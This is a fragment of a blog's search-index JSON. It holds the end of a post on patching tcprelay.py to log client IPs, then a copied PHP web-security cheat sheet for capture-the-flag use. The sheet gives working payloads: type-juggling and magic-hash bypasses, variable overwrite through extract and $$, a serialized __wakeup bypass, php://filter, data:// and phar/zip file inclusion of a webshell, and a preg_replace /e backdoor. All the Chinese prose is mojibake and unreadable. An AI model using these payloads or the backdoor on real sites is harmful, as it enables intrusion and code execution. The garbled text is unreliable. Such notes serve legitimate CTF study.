åœ¨tcprelay.pyé‡Œé¢æ‰¾åˆ°äº†é‡å®šå‘æ—¶ä¼šè°ƒç”¨çš„æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯çš„å‡½æ•°:_handel_protocol_error(), çœ‹äº†çœ‹è§‰å¾—,åªè¦ä¿®æ”¹ogn_dataå°±å¥½äº† äºæ˜¯,åœ¨æ”¹å‡½æ•°æœ€å‰é¢åŠ å…¥å¦‚ä¸‹ä»£ç : a=ogn_data.splitlines(True) a.insert(2,'X-Forwarded-For: '+client_address[0][7:]+'\\n') b='' ogn_data=b.join(a) äºæ˜¯,æˆåŠŸçš„åœ¨è½¬å‘åˆ°wpçš„httpåŒ…é‡ŒåŠ å…¥äº†X-Forwarded-Foræ¥è®°å½•çœŸå®ip ","link":"https://rainerhu.github.io/post/sss/"},{"title":"php","content":" åŸæ–‡è¿æ¥http://www.restran.net/2016/09/26/php-security-notes/ copyç”¨äºæ–¹ä¾¿æŸ¥é˜… ç³»ç»Ÿå˜é‡ $_POST // è·å– post æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸ $_GET // è·å– get æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸ $_COOKIE // è·å– cookie $_SESSION // è·å– session $_FILE // è·å–ä¸Šä¼ çš„æ–‡ä»¶ $_REQUEST // è·å– $_GETï¼Œ$_POSTï¼Œ$_COOKIE ä¸­çš„æ•°æ® é”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ @ å½“å…¶æ”¾ç½®åœ¨ä¸€ä¸ªphpè¡¨è¾¾å¼å‰,è¯¥è¡¨è¾¾å¼å¯èƒ½äº§ç”Ÿçš„é”™è¯¯ä¿¡æ¯éƒ½è¢«å¿½ç•¥ å˜é‡é»˜è®¤å€¼ å®šä¹‰ä¸€ä¸ªå˜é‡,å¦‚æœä¸è®¾ç½®å€¼,é»˜è®¤ä¸º0 $_GETå’Œ$_POST å¦‚æœåœ¨GETå‚æ•°ä¸­è®¾ç½®name[]=a,é‚£ä¹ˆ$_GET['name'] = [a]ï¼Œphp ä¼šæŠŠ []=a å½“æˆæ•°ç»„ä¼ å…¥ï¼Œ $_GET ä¼šè‡ªåŠ¨å¯¹å‚æ•°è°ƒç”¨urldecodeã€‚ $_POST åŒæ ·å­˜åœ¨æ­¤æ¼æ´ï¼Œæäº¤çš„è¡¨å•æ•°æ®ï¼Œuser[]=adminï¼Œ$_POST['user'] å¾—åˆ°çš„æ˜¯ ['admin'] æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ å†…ç½®å‡½æ•°çš„æ¾æ•£æ€§ strcmp å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼› å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ 5.2 ä¸­æ˜¯å°†ä¸¤ä¸ªå‚æ•°å…ˆè½¬æ¢æˆstringç±»å‹ã€‚ 5.3.3 ä»¥åï¼Œå½“æ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿”å›æ˜¯0ã€‚ 5.5 ä¸­å¦‚æœå‚æ•°ä¸æ˜¯stringç±»å‹ï¼Œç›´æ¥return $array=[1, 2, 3]; // æ•°ç»„è·Ÿå­—ç¬¦ä¸²æ¯”è¾ƒä¼šè¿”å› 0 //è¿™é‡Œä¼šè¾“å‡º nullï¼Œåœ¨æŸç§æ„ä¹‰ä¸Š null ä¹Ÿå°±æ˜¯ç›¸å½“äº falseï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­ä¸ºç›¸ç­‰ var_dump(strcmp($array, 'abc')); sha1 å’Œ md5 å‡½æ•° md5 å’Œ sha1 æ— æ³•å¤„ç†æ•°ç»„ï¼Œä½†æ˜¯ php æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œç›´æ¥è¿”å› fasle sha1([]) === false md5([]) === false å¼±ç±»å‹ å½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹ intval å†æ¯”è¾ƒ intval intval() åœ¨è½¬æ¢çš„æ—¶å€™ï¼Œä¼šä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢ç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ã€‚å³ä½¿å‡ºç°æ— æ³•è½¬æ¢çš„å­—ç¬¦ä¸²ï¼Œintval() ä¸ä¼šæŠ¥é”™è€Œæ˜¯è¿”å› 0ã€‚ var_dump(intval('2')) // 2 var_dump(intval('3abcd')) // 3 var_dump(intval('abcd')) // 0 è¿™ä¸ªæ—¶å€™ $a çš„å€¼æœ‰å¯èƒ½æ˜¯ 1002 unionâ€¦ if(intval($a) &gt; 1000) { mysql_query(&quot;select * from news where id=&quot;.$a) } is_numeric PHPæä¾›äº†is_numericå‡½æ•°ï¼Œç”¨æ¥å˜é‡åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ã€‚ä½†æ˜¯å‡½æ•°çš„èŒƒå›´æ¯”è¾ƒå¹¿æ³›ï¼Œä¸ä»…ä»…æ˜¯åè¿›åˆ¶çš„æ•°å­—ã€‚ &lt;?php echo is_numeric(233333); # 1 echo is_numeric('233333'); # 1 echo is_numeric(0x233333); # 1 echo is_numeric('0x233333'); # 1 echo is_numeric('233333abc'); # 0 ?&gt; in_array in_arrayå‡½æ•°ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªå€¼æ˜¯å¦åœ¨æŸä¸€ä¸ªæ•°ç»„åˆ—è¡¨é‡Œé¢ï¼Œé€šå¸¸åˆ¤æ–­æ–¹å¼å¦‚ä¸‹ï¼š in_array('b', array('a', 'b', 'c'); è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯è¿‡æ»¤ GET å‚æ•° typeid åœ¨ä¸åœ¨ 1ï¼Œ2ï¼Œ3ï¼Œ4 è¿™ä¸ªæ•°ç»„é‡Œé¢ã€‚ä½†æ˜¯ï¼Œin_array å‡½æ•°å­˜åœ¨è‡ªåŠ¨ç±»å‹è½¬æ¢ã€‚å¦‚æœè¯·æ±‚ï¼Œtypeid=1â€™ union select.. ä¹Ÿèƒ½é€šè¿‡ in_array çš„éªŒè¯ if (in_array($_GET('typeid'], array(1, 2, 3, 4))) { $sql=&quot;select â€¦. where typeid=&quot;.$_GET['typeid']&quot;; echo $sql; } array_search() PHPå¼±ç±»å‹çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹intvalå†æ¯”ã€‚ array_search ä¼šä½¿ç”¨'ctf'å’Œarrayä¸­çš„æ¯ä¸ªå€¼ä½œæ¯”è¾ƒï¼Œè€Œä¸”intval('ctf')==0., if(is_array(@$a[&quot;a2&quot;])){ if(count($a[&quot;a2&quot;])!==5 OR !is_array($a[&quot;a2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;ctf&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;a2&quot;] as $key=&gt;$val){ $val===&quot;ctf&quot;?die(&quot;nope&quot;):NULL; } $v2=1; } å’Œ= ==æ˜¯å¼±ç±»å‹çš„æ¯”è¾ƒ ===æ¯”è¾ƒç¬¦åˆ™å¯ä»¥é¿å…è¿™ç§,éšå¼è½¬æ¢,é™¤äº†æ£€æŸ¥å€¼è¿˜æ£€æŸ¥ç±»å‹ ä»¥ä¸‹æ¯”è¾ƒçš„ç»“æœéƒ½ä¸º true // 0x å¼€å¤´ä¼šè¢«å½“æˆ16è¿›åˆ¶54975581388çš„16è¿›åˆ¶ä¸º 0xccccccccc // åå…­è¿›åˆ¶ä¸æ•´æ•°ï¼Œè¢«è½¬æ¢ä¸ºåŒä¸€è¿›åˆ¶æ¯”è¾ƒ '0xccccccccc' == '54975581388' // å­—ç¬¦ä¸²åœ¨ä¸æ•°å­—æ¯”è¾ƒå‰ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºæ•°å­—ï¼Œå¦‚æœä¸èƒ½è½¬æ¢ä¸ºæ•°å­—ä¼šå˜æˆ0 1 == '1' 1 == '01' 10 == '1e1' 100 == '1e2' 0 == 'a' // a è½¬æ¢ä¸ºæ•°å­—ä¸º 0 // åå…­è¿›åˆ¶æ•°ä¸å¸¦ç©ºæ ¼åå…­è¿›åˆ¶æ•°ï¼Œè¢«è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•´æ•° '0xABCdef' == ' 0xABCdef' '0010e2' == '1e3' hash æ¯”è¾ƒçš„é—®é¢˜ hashç¢°æ’ 0e å¼€å¤´ä¸”åé¢éƒ½æ˜¯æ•°å­—ä¼šè¢«å½“ä½œç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå°±æ˜¯ç­‰äº 0*10^xxx=0ã€‚å¦‚æœ md5 æ˜¯ä»¥ 0e å¼€å¤´ï¼Œåœ¨åšæ¯”è¾ƒçš„æ—¶å€™ï¼Œå¯ä»¥ç”¨è¿™ç§æ–¹æ³•ç»•è¿‡ã€‚ // '0e5093234' ä¸º 0ï¼Œ'0eabc3234' ä¸ä¸º 0 // true '0e509367213418206700842008763514' == '0e481036490867661113260034900752' // true '0e481036490867661113260034900752' == '0' // false var_dump('0' == '0e1abcd'); // true var_dump(0 == '0e1abcd'); var_dump(md5('240610708') == md5('QNKCDZO')); var_dump(md5('aabg7XSs') == md5('aabC9RqS')); var_dump(sha1('aaroZmOk') == sha1('aaK1STfY')); var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m')); å¦‚æœè¦æ‰¾å‡º 0e å¼€å¤´çš„ hash ç¢°æ’ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹ä»£ç  &lt;?php $salt = 'vunp'; $hash = '0e612198634316944013585621061115'; for ($i=1; $i&lt;100000000000; $i++) { if (md5($salt . $i) == $hash) { echo $i; break; } } echo ' done'; switch å¦‚æœ switch æ˜¯æ•°å­—ç±»å‹çš„ case çš„åˆ¤æ–­æ—¶ï¼Œ switch ä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸º int ç±»å‹ã€‚ $i =&quot;2abc&quot;; switch ($i) { case 0: case 1: case 2: echo &quot;i is less than 3 but not negative&quot;; break; case 3: echo &quot;i is 3&quot;; } è¿™ä¸ªæ—¶å€™ç¨‹åºè¾“å‡ºçš„æ˜¯ i is less than 3 but not negativeï¼Œæ˜¯ç”±äº switch() å‡½æ•°å°† $i è¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œè½¬æ¢ç»“æœä¸º 2ã€‚ æ­£åˆ™è¡¨è¾¾å¼ preg_matc å¦‚æœåœ¨è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¶å€™ï¼Œæ²¡æœ‰é™åˆ¶å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸ(^å’Œ $)ï¼Œåˆ™å¯ä»¥å­˜åœ¨ç»•è¿‡çš„é—®é¢˜ $ip = '1.1.1.1 abcd'; // å¯ä»¥ç»•è¿‡ if(!preg_match(&quot;/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/&quot;,$ip)) { die('error'); } else { // echo('key...') } ereg %00 æˆªæ–­ ereg è¯»åˆ° %00 çš„æ—¶å€™ï¼Œå°±æˆªæ­¢äº† &lt;?php if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET['a']) === FALSE) { echo 'You password must be alphabet'; } ?&gt; è¿™é‡Œ a=abcd%001234ï¼Œå¯ä»¥ç»•è¿‡ å˜é‡è¦†ç›– extract extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚ &lt;?php $auth = '0'; // è¿™é‡Œå¯ä»¥è¦†ç›–$authçš„å˜é‡å€¼ extract($_GET); if($auth == 1){ echo &quot;private!&quot;; } else{ echo &quot;public!&quot;; } ?&gt; //GETä¸¾ä¾‹ playload:?gift=flag&amp;flag=php://input &lt;?php $flag='mail.txt'; extract($_GET); // è¿™é‡Œå¯ä»¥è¦†ç›– if(isset($gift)) { $content=trim(file_get_contents($flag)); echo $content; if($gift==$content){ echo'flag'; } else{ echo'flagè¢«åŠ å¯†äº† å†åŠ å¯†ä¸€æ¬¡å°±å¾—åˆ°flagäº†'; } } ?&gt; parse_str parse_str() çš„ä½œç”¨æ˜¯è§£æå­—ç¬¦ä¸²ï¼Œå¹¶æ³¨å†Œæˆå˜é‡ã€‚ä¸ parse_str() ç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰ mb_parse_str()ï¼Œparse_str å°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡ï¼Œå¦‚æœå‚æ•° str æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸã€‚ //var.php?var=new $var='init'; parse_str($_SERVER['QUERY_STRING']); // $var ä¼šå˜æˆ new echo $var; import_request_variables()å˜é‡è¦†ç›– //1.php?a=1 è¿”å› true! &lt;?php $a = '0'; import_request_variables('G'); if($a == 1){ echo &quot;true!&quot;; }else{ echo &quot;false!&quot;; } ?&gt; import_request_variables()ï¼Œå°† GETï¼POSTï¼Cookie å˜é‡å¯¼å…¥åˆ°å…¨å±€ä½œç”¨åŸŸä¸­ã€‚å¦‚æœä½ ç¦æ­¢äº† register_globalsï¼Œä½†åˆæƒ³ç”¨åˆ°ä¸€äº›å…¨å±€å˜é‡ï¼Œé‚£ä¹ˆæ­¤å‡½æ•°å°±å¾ˆæœ‰ç”¨ã€‚ $$ å˜é‡è¦†ç›– å¦‚æœæŠŠå˜é‡æœ¬èº«çš„ key ä¹Ÿå½“å˜é‡ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨äº† $$ï¼Œå°±å¯èƒ½å­˜åœ¨é—®é¢˜ $_ = '_POST'; // $$_ æ˜¯ç­‰äº $_POST ä¾‹ä¸€: &lt;?php $id=1; foreach (array('_GET','_POST') as $request) { foreach ($$request as $key =&gt; $value) { echo $key.&quot; &quot;.$value.&quot;&lt;/br&gt;&quot;; ${$key}=$value; //echo $$key; } } echo $id; ?&gt; ä¾‹äºŒ: &lt;?php $a='hello'; foreach($_GET as $key =&gt; $value{ $$key = $value; } print $a; ?&gt; è¿™é‡Œä¼šå…ˆæŠŠ$keyè¾“å‡ºæ¥ï¼Œè®©ä½ æ˜ç¡®æ˜¯å¦‚ä½•è¦†ç›–å’Œè¦†ç›–äº†ä»€ä¹ˆï¼Œåƒå½“å‰æ–‡ä»¶æäº¤index.php?id=xxxx,å°±å¯ä»¥è¦†ç›–æ‰$idçš„å€¼ã€‚ unset unset($bar); ç”¨æ¥é”€æ¯æŒ‡å®šçš„å˜é‡ï¼Œå¦‚æœå˜é‡ $bar åŒ…å«åœ¨è¯·æ±‚å‚æ•°ä¸­ï¼Œå¯èƒ½å‡ºç°é”€æ¯ä¸€äº›å˜é‡è€Œå®ç°ç¨‹åºé€»è¾‘ç»•è¿‡ // http://127.0.0.1/index.php?_CONFIG=123 $_CONFIG['extraSecure'] = true; foreach(array('_GET','_POST') as $method) { foreach($$method as $key=&gt;$value) { // $key == _CONFIG // $$key == $_CONFIG // è¿™ä¸ªå‡½æ•°ä¼šæŠŠ $_CONFIG å˜é‡é”€æ¯ unset($$key); } } if ($_CONFIG['extraSecure'] == false) { echo 'flag {****}'; } ç‰¹æ®Šçš„ PHP ä»£ç æ ¼å¼ .php2 .php3 .php4 .php5 .php7 .phtml æ­£åˆ™æ£€æµ‹æ–‡ä»¶å†…å®¹ä¸­åŒ…å« &lt;? å°±å¼‚å¸¸é€€å‡ºï¼Œé€šå¸¸çš„PHPä»£ç å°±ä¸è¡Œäº†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼ç»•è¿‡ &lt;script language=&quot;php&quot;&gt; echo base64_encode(file_get_contents('flag.php')); &lt;/script&gt; æ•ˆæœç­‰äº echo â€˜aâ€™; &lt;?='a';?&gt; å¦‚æœåœ¨ php.ini æ–‡ä»¶ä¸­é…ç½®å…è®¸ ASP é£æ ¼çš„æ ‡ç­¾ Allow ASP-style &lt;% %&gt; tags. ; http://php.net/asp-tags asp_tags = On åˆ™å¯ä»¥ä½¿ç”¨è¯¥æ–¹å¼ &lt;% echo 'a'; %&gt; ä¼ªéšæœºæ•° mt_rand() mt_rand() å‡½æ•°æ˜¯ä¸€ä¸ªä¼ªéšæœºå‘ç”Ÿå™¨ï¼Œå³å¦‚æœçŸ¥é“éšæœºæ•°ç§å­æ˜¯å¯ä»¥é¢„æµ‹çš„ã€‚ $seed = 12345; mt_rand($seed); $ss = mt_rand(); linux 64 ä½ç³»ç»Ÿä¸­ï¼Œrand() å’Œ mt_rand() äº§ç”Ÿçš„æœ€å¤§éšæœºæ•°éƒ½æ˜¯2147483647ï¼Œæ­£å¥½æ˜¯ 2^31-1ï¼Œä¹Ÿå°±æ˜¯è¯´éšæœºæ’­ç§çš„ç§å­ä¹Ÿæ˜¯åœ¨è¿™ä¸ªèŒƒå›´ä¸­çš„ï¼Œ0 â€“ 2147483647 çš„è¿™ä¸ªèŒƒå›´æ˜¯å¯ä»¥çˆ†ç ´çš„ã€‚ ä½†æ˜¯ç”¨ php çˆ†ç ´æ¯”è¾ƒæ…¢ï¼Œæœ‰ä¸€ä¸ª C çš„ç‰ˆæœ¬ï¼Œå¯ä»¥æ ¹æ®éšæœºæ•°ï¼Œçˆ†ç ´å‡ºç§å­ php_mt_seedã€‚ åœ¨ php &gt; 4.2.0 çš„ç‰ˆæœ¬ä¸­ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– mt_srand() å‡½æ•°ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ï¼Œç°å·²ç”± PHP è‡ªåŠ¨å®Œæˆã€‚php ä¸­äº§ç”Ÿä¸€ç³»åˆ—çš„éšæœºæ•°æ—¶ï¼Œåªè¿›è¡Œäº†ä¸€æ¬¡æ’­ç§ï¼Œè€Œä¸æ˜¯æ¯æ¬¡è°ƒç”¨ mt_rand() éƒ½è¿›è¡Œæ’­ç§ã€‚ rand() rand() å‡½æ•°åœ¨äº§ç”Ÿéšæœºæ•°çš„æ—¶å€™æ²¡æœ‰è°ƒç”¨ srand()ï¼Œåˆ™äº§ç”Ÿçš„éšæœºæ•°æ˜¯æœ‰è§„å¾‹å¯è¯¢çš„ã€‚å…·ä½“çš„è¯´æ˜è¯·çœ‹è¿™é‡Œã€‚äº§ç”Ÿçš„éšæœºæ•°å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªå…¬å¼é¢„æµ‹: //ä¸€èˆ¬é¢„æµ‹å€¼å¯èƒ½æ¯”å®é™…å€¼è¦å·®1 state[i] = state[i-3] + state[i-31] å¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç éªŒè¯ä¸€ä¸‹ &lt;?php $randStr = array(); for($i=0;$i&lt;50;$i++) { //å…ˆäº§ç”Ÿ 32ä¸ªéšæœºæ•° $randStr[$i]=rand(0,30); if($i&gt;=31) { echo &quot;$randStr[$i]=(&quot;.$randStr[$i-31].&quot;+&quot;.$randStr[$i-3].&quot;) mod 31&quot;.&quot;\\n&quot;; } } ?&gt; ååºåˆ—åŒ– _construct()ï¼šæ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡åˆ›å»º(new)æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„ã€‚ __destruct()ï¼šææ„å‡½æ•°ï¼Œå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ __wakeup() ï¼šå¦‚å‰æ‰€æï¼Œunserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ PHP unserialize() åä¼šå¯¼è‡´ __wakeup() æˆ– __destruct() çš„ç›´æ¥è°ƒç”¨ï¼Œä¸­é—´æ— éœ€å…¶ä»–è¿‡ç¨‹ã€‚å› æ­¤æœ€ç†æƒ³çš„æƒ…å†µå°±æ˜¯ä¸€äº›æ¼æ´/å±å®³ä»£ç åœ¨ __wakeup() æˆ– __destruct() ä¸­ã€‚ __wakeup å‡½æ•°ç»•è¿‡ PHP æœ‰ä¸ª Bugï¼Œå¦‚æœååºåˆ—åŒ–å‡ºç°é—®é¢˜ï¼Œä¼šä¸å»æ‰§è¡Œ __wakeup å‡½æ•°ï¼Œä¾‹å¦‚ï¼š &lt;?php class xctf { public $flag = &quot;111&quot;; public function __wakeup() { exit('bad requests'); } } //echo serialize(new xctf()); echo unserialize($_GET['code']); echo &quot;flag{****}&quot;; ?&gt; ä½¿ç”¨è¿™ä¸ª payload ç»•è¿‡ __wakeup å‡½æ•° # O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} http://www.example.com/index.php?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;} åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå‰é¢çš„æ•°å­—ä»£è¡¨çš„æ˜¯åé¢å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„ä¸ªæ•°ï¼Œå¦‚æœæ•°å­—ä¸å­—ç¬¦ä¸ªæ•°ä¸åŒ¹é…çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå› æ­¤å°†1æ”¹æˆ2å°±ä¼šäº§ç”ŸæŠ¥é”™ï¼Œå¯¼è‡´ä¸ä¼šå»æ‰§è¡Œ __wakeup å‡½æ•°ï¼Œä»è€Œç»•è¿‡è¯¥å‡½æ•°ã€‚ æ–‡ä»¶åŒ…å« http://10.2.1.1:20770/index.php?page=upload è¿™ç§ url å¾ˆå®¹æ˜“å°±èƒ½æƒ³åˆ°å¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«æˆ–è€…ä¼ªåè®®è¯»å– http://10.2.1.1:20770/index.php?page=php://filter/read=convert.base64-encode/resource=upload å‘½ä»¤æ‰§è¡Œ åå¼•å·` åå¼•å· ` å¯ä»¥è°ƒç”¨ shell_exec æ­£å¸¸æ‰§è¡Œä»£ç  `$_GET['v']` ç›¸å½“äº shell_exec($_GET['v']) preg_replace() è§¦å‘æ¡ä»¶ï¼š ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦eæ ‡è¯†ç¬¦ï¼Œæœ‰äº†å®ƒå¯ä»¥æ‰§è¡Œç¬¬äºŒä¸ªå‚æ•°çš„å‘½ä»¤ ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­çš„ä¸­æœ‰åŒ¹é…ï¼Œä¸ç„¶echoä¼šè¿”å›ç¬¬ä¸‰ä¸ªå‚æ•°è€Œä¸æ‰§è¡Œå‘½ä»¤ï¼Œä¸¾ä¸ªä¾‹å­ï¼š // è¿™æ ·æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ echo preg_replace('/test/e', 'phpinfo()', 'just test'); // è¿™ç§æ²¡æœ‰åŒ¹é…ä¸Šï¼Œæ‰€ä»¥è¿”å›å€¼æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¸ä¼šæ‰§è¡Œå‘½ä»¤ echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„åé—¨ä»£ç  @preg_replace(&quot;//e&quot;, $_GET['h'], &quot;Access Denied&quot;); echo preg_replace(&quot;/test/e&quot;, $_GET[&quot;h&quot;], &quot;jutst test&quot;); å½“è®¿é—®è¿™æ ·è¿™æ ·çš„é“¾æ¥æ—¶å°±å¯ä»¥è¢«è§¦å‘ http://localhost:8000/testbug.php?h=phpinfo(); ä¼ªåè®® php://filter è¯»å–æ–‡ä»¶ /lfi.php?file=php://filter/convert.base64-encode/resource=flag.php /lfi.php?file=php://filter/read=convert.base64-encode/resource=flag.php php://input å†™å…¥æ–‡ä»¶ï¼Œ æ•°æ®åˆ©ç”¨ POST ä¼ è¿‡å» /test.php?file=php://input data:// å°† include çš„æ–‡ä»¶æµé‡å®šå‘åˆ°ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥æµ /test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== //base64éƒ¨åˆ†ä¸º:&lt;?php phpinfo();exit();// å¯ä»¥ç”¨äºæ§åˆ¶ file_get_contents çš„å†…å®¹ä¸ºç”¨æˆ·è¾“å…¥çš„æµ $file=$_GET['file']; $data = @file_get_contents($a,'r'); echo $data; phar:// å‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ— æ³•ç»•è¿‡ï¼Œä»…èƒ½ä¸Šä¼ jpgåç¼€çš„æ–‡ä»¶ã€‚ä¸æ­¤åŒæ—¶ï¼Œæ— æ³•è¿›è¡Œæ–‡ä»¶åŒ…å«æˆªæ–­ã€‚allow_url_include=on çš„çŠ¶æ€ä¸‹ï¼Œå°±å¯ä»¥è€ƒè™‘pharä¼ªåè®®ç»•è¿‡ã€‚ å†™ä¸€ä¸ªshell.phpæ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«ä¸€å¥è¯æœ¨é©¬ã€‚ç„¶åï¼Œå‹ç¼©æˆxxx.zipã€‚ç„¶åæ”¹åä¸ºxxx.jpgè¿›è¡Œä¸Šä¼ ã€‚æœ€åä½¿ç”¨pharè¿›è¡ŒåŒ…å« è¿™é‡Œçš„è·¯å¾„ä¸ºä¸Šä¼ çš„ jpg æ–‡ä»¶åœ¨æœåŠ¡å™¨çš„è·¯å¾„ /index.php?id=phar://è·¯å¾„/xxx.jpg/shell zip:// ä¸Šè¿° phar:// çš„æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨ zip:// ç„¶åå§1.phpæ–‡ä»¶å‹ç¼©æˆzipï¼Œå†æŠŠzipçš„åç¼€æ”¹ä¸ºpngï¼Œä¸Šä¼ ä¸Šå»ï¼Œå¹¶ä¸”å¯ä»¥è·å¾—ä¸Šä¼ ä¸Šå»çš„pngçš„åœ°å€ã€‚ 1.zipæ–‡ä»¶å†…ä»…æœ‰1.phpè¿™ä¸ªæ–‡ä»¶ /php?file=zip://1.png%231.php // ä¹Ÿå¯ä»¥å°è¯•ä¸æ”¹åä¸ºpngï¼Œç›´æ¥ä½¿ç”¨zipä¸Šä¼ æµ‹è¯•ä¸€ä¸‹ /php?file=zip://1.zip%231.php æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ­£å¸¸çš„æ–‡ä»¶ä¸Šä¼ æµç¨‹æ˜¯è¿™æ ·çš„ï¼Œé¦–å…ˆæ¥æ”¶ POST çš„æ–‡ä»¶ï¼Œåœ¨ tmp ç›®å½•ä¸‹ç”Ÿæˆä¸´æ—¶æ–‡ä»¶ï¼Œæ–‡ä»¶åæ˜¯ php[A-Za-z0-9]{6}ï¼Œåœ¨ php å¤„ç†ååˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œè™½ç„¶æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯åªè¦æ–‡ä»¶ä¸Šä¼ å¼€å¯äº†å°±ä¸€å®šä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¿™ä¸­é€”å¦‚æœ php æ„å¤–é€€å‡ºåˆ™ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ï¼Œé€ æˆ /tmp ç›®å½•ä¸‹å¯ä»¥ç•™ä¸‹ä»»ä½•å†…å®¹ã€‚ å†…å®¹æ„é€ å¥½åï¼Œå•çº¯çˆ†ç ´ /tmp/phpxxxxxx æ–‡ä»¶åæ˜¯ä¸å¤ªç°å®ä½†æ˜¯ä¹Ÿå¯è¡Œçš„ã€‚ é€šè¿‡æ–‡ä»¶åŒ…å«ï¼Œè®©å…¶åŒ…å«æœ¬èº«ï¼Œé€ æˆæ— é™å¾ªç¯åå‘å‡º SIGSEGV ä¿¡å·ï¼Œå¯ä»¥å¯¼è‡´ php æ„å¤–é€€å‡ºã€‚ ","link":"https://rainerhu.github.io/post/php/"}]}